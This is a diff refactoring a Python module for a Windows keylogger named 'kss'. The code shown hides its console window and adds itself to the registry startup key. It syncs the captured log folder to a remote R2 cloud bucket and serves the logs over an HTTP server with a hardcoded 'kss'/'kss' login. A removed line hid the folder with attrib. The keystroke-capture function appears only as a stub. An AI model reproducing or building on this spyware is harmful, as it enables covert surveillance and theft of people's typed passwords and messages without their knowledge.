@@ -1,39 +1,22 @@
 import socket
 import os
 import datetime
-import netifaces
 import winreg
-import time
-# from sync_ftp import SyncFtp
-from sync_r2 import R2FolderSync
 import http.server
 import base64
 import socketserver
-import platform
+from log_utils import log_console
+from sync_r2 import R2FolderSync
 
 
-# get the user name as identifier
 def user_name():
-    # Implement your logic to get the current username
     return os.getlogin()
 
 
-# get the current date and time as a string
 def current_time():
-    # Return current time as a string for filenames
-    import datetime
-
     return datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
 
 
-#   getting current active network interface
-def active_interface():
-    # Implement your logic to get the active network interface
-    # Placeholder for actual implementation
-    return "Ethernet"
-
-
-# For creating app dir
 def dir_path():
     home_path = os.path.expanduser("~")
     dir_name = "kss"
@@ -41,8 +24,7 @@ def dir_path():
     dir_path = os.path.join(app_root, user_name())
     if not os.path.exists(dir_path):
         os.makedirs(dir_path)
-    os.chdir(dir_path)
-    os.system(f"attrib +h /s /d {app_root}")
+    os.chdir(dir_path) 
     return dir_path
 
 
@@ -55,7 +37,7 @@ def hide_console():
         win32gui.ShowWindow(window, 0)
         return True
     except Exception as e:
-        print(f"Failed to hide console: {e}")
+        log_console(f"Failed to hide console: {e}", "ERROR")
         return False
 
 
@@ -72,9 +54,9 @@ def add_startup():
         open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
         winreg.SetValueEx(open_key, "kss", 0, winreg.REG_SZ, address)
         winreg.CloseKey(open_key)
-        print("Added to startup successfully.")
+        log_console("Added to startup successfully.", "SUCCESS")
     except Exception as e:
-        print(f"Failed to add to startup: {e}")
+        log_console(f"Failed to add to startup: {e}", "ERROR")
 
 
 # check if internet is connected or not
@@ -83,8 +65,7 @@ def is_connected():
         socket.create_connection(("www.google.com", 80))
         return True
     except OSError:
-        pass
-    return False
+        return False
 
 
 # Upload log directory to ftp server
@@ -99,28 +80,18 @@ def sync(sync_interval=5, continuous=False):
         if "kss" in dir_list:
             source_path = os.path.join(home_path, "kss")
             syncer = R2FolderSync(local_folder=source_path, sync_interval=sync_interval)
-            print(f"Starting sync for folder: {source_path}")
+            log_console(f"Starting sync for folder: {source_path}", "INFO")
             if continuous:
-                print(f"Continuous sync enabled. Interval: {sync_interval} seconds.")
+                log_console(f"Continuous sync enabled. Interval: {sync_interval} seconds.", "INFO")
                 syncer.start_sync_loop()  # Handles its own interval and loop
             else:
                 syncer.sync_once()
-                print("Sync completed.")
+                log_console("Sync completed.", "SUCCESS")
         else:
-            print("No 'kss' directory found in home path. Sync skipped.")
+            log_console("No 'kss' directory found in home path. Sync skipped.", "WARNING")
     except Exception as e:
-        print(f"Error during sync: {e}")
+        log_console(f"Error during sync: {e}", "ERROR")
 
-
-def log_console(message, level="INFO"):
-    levels = {
-        "INFO": "[*]",
-        "ERROR": "[!]",
-        "SUCCESS": "[+]",
-        "WARNING": "[!]"
-    }
-    prefix = levels.get(level.upper(), "[*]")
-    print(f"{prefix} {message}")
 
 class AuthHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -129,7 +100,7 @@ class AuthHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(401)
             self.send_header("WWW-Authenticate", 'Basic realm="Test"')
             self.end_headers()
-            log_console("Unauthorized (no credentials)", "WARNING")
+            log_console("Unauthorized", "WARNING")
             return
         auth_type, auth_string = auth_header.split()
         try:
@@ -140,10 +111,11 @@ class AuthHandler(http.server.SimpleHTTPRequestHandler):
             return
         if auth_type != "Basic" or creds != ["kss", "kss"]:
             self.send_error(401, "Unauthorized")
-            log_console("Unauthorized (wrong credentials)", "WARNING")
+            log_console("Unauthorized", "WARNING")
             return
         log_console(f"Authorized: {self.client_address[0]}", "INFO")
         super().do_GET()
+
 
 def server(port=8000):
     """Starts the local HTTP server with basic authentication."""
@@ -154,3 +126,16 @@ def server(port=8000):
             httpd.serve_forever()
         except KeyboardInterrupt:
             log_console("Server stopped", "INFO")
+
+
+def active_interface():
+    # TODO: Implement actual logic if needed
+    return "Ethernet"
+
+
+def key_logger():
+    log_console("Key Logger started and running...", "INFO")
+    log_dir = dir_path()  # Ensure this returns the full path to your log directory
+    log_filename = os.path.join(log_dir, f"keylog-{user_name()}_{current_time()}.txt")
+    # logger = setup_logger(log_filename, "KeyLogger")
+    # ... rest of your code ...
